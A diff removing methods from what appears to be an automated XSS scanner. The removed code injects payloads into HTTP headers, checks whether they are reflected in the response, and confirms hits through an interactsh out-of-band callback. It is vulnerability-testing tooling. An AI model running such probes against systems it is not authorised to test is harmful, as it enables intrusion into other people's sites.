-        """Test a single header with all payloads."""
-        for payload in payloads:
-            finding = await self._test_header_with_payload(header_name, payload)
-            if finding:
-                return finding
-        return None
-
-    async def _test_header_with_payload(self, header_name: str, payload: str) -> Optional[XSSFinding]:
-        """Test a single header with a specific payload."""
-        try:
-            response_html = await self._send_header_request(header_name, payload)
-
-            # Check if header value is reflected
-            if not self._is_header_reflected(payload, response_html):
-                return None
-
-            dashboard.log(f"[{self.name}] 🎯 Header '{header_name}' reflects payload!", "SUCCESS")
-
-            # Create evidence and check for OOB
-            evidence = self._create_header_evidence(header_name, payload)
-            if await self._check_header_oob_hit(evidence):
-                return self._create_header_finding(header_name, payload, evidence)
-
-        except Exception as e:
-            logger.debug(f"Header test failed for {header_name}: {e}")
-
-        return None
-
-    async def _send_header_request(self, header_name: str, payload: str) -> str:
-        """Send HTTP request with payload in header."""
-        headers = {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-            header_name: payload
-        }
-
-        # Use HTTPClientManager for proper connection management (v2.4)
-        async with http_manager.session(ConnectionProfile.PROBE) as session:
-            async with session.get(
-                self.url,
-                headers=headers,
-                ssl=False
-            ) as resp:
-                return await resp.text()
-
-    def _is_header_reflected(self, payload: str, response_html: str) -> bool:
-        """Check if header payload is reflected in response."""
-        return payload in response_html or payload[:20] in response_html
-
-    def _create_header_evidence(self, header_name: str, payload: str) -> Dict:
-        """Create evidence dictionary for header injection."""
-        return {
-            "vector": "header",
-            "header_name": header_name,
-            "payload": payload,
-            "reflected": True
-        }
-
-    async def _check_header_oob_hit(self, evidence: Dict) -> bool:
-        """Check for OOB callback from header injection."""
-        if not self.interactsh:
-            return False
-
-        await asyncio.sleep(1)
-        hit = await self.interactsh.check_hit("header_xss")
-
-        if hit:
-            evidence["interactsh_hit"] = True
-            return True
-
-        return False
-
-    def _create_header_finding(self, header_name: str, payload: str, evidence: Dict) -> XSSFinding:
-        """Create XSSFinding for confirmed header injection."""
-        return XSSFinding(
-            url=self.url,
-            parameter=f"HEADER:{header_name}",
-            payload=payload,
-            context=f"Header injection via {header_name}",
-            validation_method="header_injection",
-            evidence=evidence,
-            confidence=0.95,
-            status="VALIDATED_CONFIRMED",
-            validated=True,
-            reflection_context="http_header"
-        )
 
     async def _fetch_page_forms(self, url: str) -> Optional[str]:
         """Fetch page HTML for form discovery."""
